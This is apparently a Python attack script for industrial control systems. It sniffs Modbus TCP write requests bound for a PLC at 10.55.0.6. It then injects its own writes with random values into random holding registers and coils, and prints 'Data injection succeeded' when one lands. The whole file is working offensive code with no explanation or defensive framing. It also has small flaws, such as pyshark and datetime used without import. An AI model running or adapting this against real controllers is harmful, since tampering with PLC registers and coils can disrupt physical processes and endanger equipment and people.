import modbus_tk.modbus_tcp as mt
import modbus_tk.defines as md
from time import *
from scapy.all import *
from random import *

#start = time.perf_counter()
plc = mt.TcpMaster('10.55.0.6', 502)

def changeData_reg():
        i = randrange(100, 109)
        q = randrange(1, 500)
        plc.execute(slave=1, function_code=(md.WRITE_MULTIPLE_REGISTERS), starting_address=i, quantity_of_x=1, output_value=[q])
def changeData0():
        i = randrange(40, 50)
        plc.execute(slave=1, function_code=(md.WRITE_SINGLE_COIL), starting_address=i, quantity_of_x=1, output_value=0)

def changeData1():
        i = randrange(40, 50)
        plc.execute(slave=1, function_code=(md.WRITE_SINGLE_COIL), starting_address=i, quantity_of_x=1, output_value=1)



xx = 1
while xx:
        plc_frames = pyshark.LiveCapture(interface='usb0', bpf_filter='dst host 10.55.0.6 and dst port 502 and tcp[13] = 0x18')
        plc_frames.sniff(packet_count=1)
        modbus_query = plc_frames[0]
        try:
            func = str(modbus_query.modbus.func_code)
            if func == '16':
                        changeData_reg()
                        xx = 0
                        print("\033[1;36m ===Data injection succeeded !! {} =================\033[0m".format(datetime.now()))
                        print("\033[1;36m{}\033[0m".format(modbus_query.show()))
            elif str(modbus_query.modbus.data) == 'ff:00':
                        changeData0()
                        xx = 0
                        print("\033[1;35m ===Data injection succeeded !! {} =================\033[0m".format(datetime.now()))
                        print("\033[1;36m{}\033[0m".format(modbus_query.show()))
            elif str(modbus_query.modbus.data) == '00:00':
                        changeData1()
                        xx = 0
                        print("\033[1;33m ===Data injection succeeded !! {} =================\033[0m".format(datetime.now()))
                        print("\033[1;36m{}\033[0m".format(modbus_query.show()))
        except:
            xx = 1
#end = time.perf_counter()
#print("\033[1;33m=====================Executed time : {}s ======================\033[0m".format(end-start))
exit()
